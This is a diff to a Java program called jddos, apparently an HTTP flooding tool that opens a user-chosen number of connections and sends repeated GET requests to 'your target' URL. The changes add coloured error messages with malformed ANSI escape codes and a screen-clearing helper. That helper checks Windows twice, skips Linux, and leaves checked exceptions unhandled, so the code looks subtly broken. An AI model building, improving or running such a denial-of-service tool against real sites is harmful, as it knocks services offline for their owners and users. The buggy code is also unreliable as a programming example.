@@ -31,7 +31,7 @@ class httpcon implements Runnable{
                 connection.setRequestMethod("GET");
                 connection.setRequestProperty("User-Agent", user_agent());
                 if (connection.getResponseCode() != 200){
-                    System.out.println("Error: Server might be down");
+                    System.out.println("\u001B[34 Error: Server might be down \u001B[0");
                 }
                 //System.out.println(connection.getResponseCode());
             } catch (Exception e) {
@@ -42,6 +42,14 @@ class httpcon implements Runnable{
 }
 
 public class jddos{
+    public static String platform = System.getProperty("os.name").toLowerCase();
+    
+    public static void clear_system(){
+        if(Windows()){new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();}
+        if(Windows()){new ProcessBuilder("clear").inheritIO().start().waitFor();}
+        if(Mac()){new ProcessBuilder("clear").inheritIO().start().waitFor();}
+    }
+
     public static void main(String[] args) {
         try {
             for (int x = 0; x< Integer.parseInt(args[1]); x++){
@@ -53,9 +61,12 @@ public class jddos{
             }
         } catch (java.lang.ArrayIndexOutOfBoundsException e) {
             System.out.println("Usage: java jddos https://www.yourtarget.com 100");
-            System.out.println("                          [your target]    [your connections]");
+            System.out.println("                        [your target]    [your connections]");
 
         }
             
-    }   
+    }
+    public static boolean Windows(){return platform.contains("windows")| platform.contains("win");}
+    public static boolean Linux(){return platform.contains("linux")| platform.contains("unix");}
+    public static boolean Mac(){return platform.contains("mac");}
 }
